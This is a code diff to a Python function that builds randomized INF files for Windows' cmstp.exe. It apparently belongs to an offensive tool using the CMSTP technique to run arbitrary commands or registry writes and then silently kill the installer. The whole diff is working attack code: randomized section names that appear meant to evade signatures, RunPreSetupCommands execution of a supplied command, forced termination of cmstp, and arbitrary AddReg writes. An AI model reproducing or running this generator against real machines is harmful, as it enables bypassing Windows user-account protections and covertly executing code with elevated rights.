@@ -221,41 +221,33 @@ class Dismisser:
 
 
 def build_inf(cmd, svc_name, addreg=None):
-    """addreg present → pure AddReg INF: NO RunPreSetupCommands at all, no
-    child process, no taskkill — cmstp completes the profile install and
-    exits itself after performing the registry writes."""
-    s1, s3 = f"D{rand_str(4)}", f"L{rand_str(4)}"
-    if addreg:
+    """addreg present → pure AddReg INF: no RunPreSetupCommands, no child
+    process at all — cmstp performs the AddReg writes itself and exits.
+    addreg None → the command INF (exec road)."""
+    s1 = f"D{rand_str(4)}"
+    cmd_block = ""
+    addreg_txt = ""
+    if addreg is None:
+        s2 = f"C{rand_str(4)}"
+        cmd_block = (f"RunPreSetupCommands={{{s2}}}\n"
+                     f"[{{{s2}}}]\n"
+                     f"{cmd}\n"
+                     "taskkill /IM cmstp.exe /F\n")
+    else:
         s4 = f"R{rand_str(4)}"
-        return f"""; {rand_str(16)}
-[version]
-Signature=$chicago$
-AdvancedINF=2.5
-[DefaultInstall]
-CustomDestination={s1}
-AddReg={{{s4}}}
-[{{{s4}}}]
-""" + "\n".join(addreg) + f"""
-[{{{s1}}}]
-49000,49001={s3}, 7
-[{{{s3}}}]
-"HKLM", "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
-[Strings]
-ServiceName="{svc_name}"
-ShortSvcName="{rand_str(4)}"
-"""
-    s1, s2, s3 = f"D{rand_str(4)}", f"C{rand_str(4)}", f"L{rand_str(4)}"
+        addreg_txt = (f"AddReg={{{s4}}}\n"
+                      f"[{{{s4}}}]\n"
+                      + "\n".join(addreg) + "\n")
+    # built as a normal literal — ONE backslash per separator, the shape
+    # the sample used and the ParseInf accepts
+    s3 = f"L{rand_str(4)}"
     return f"""; {rand_str(16)}
 [version]
 Signature=$chicago$
 AdvancedINF=2.5
 [DefaultInstall]
 CustomDestination={s1}
-RunPreSetupCommands={s2}
-{addreg_block}[{{{s2}}}]
-{cmd}
-taskkill /IM cmstp.exe /F
-[{{{s1}}}]
+{cmd_block}{addreg_txt}[{{{s1}}}]
 49000,49001={s3}, 7
 [{{{s3}}}]
 "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
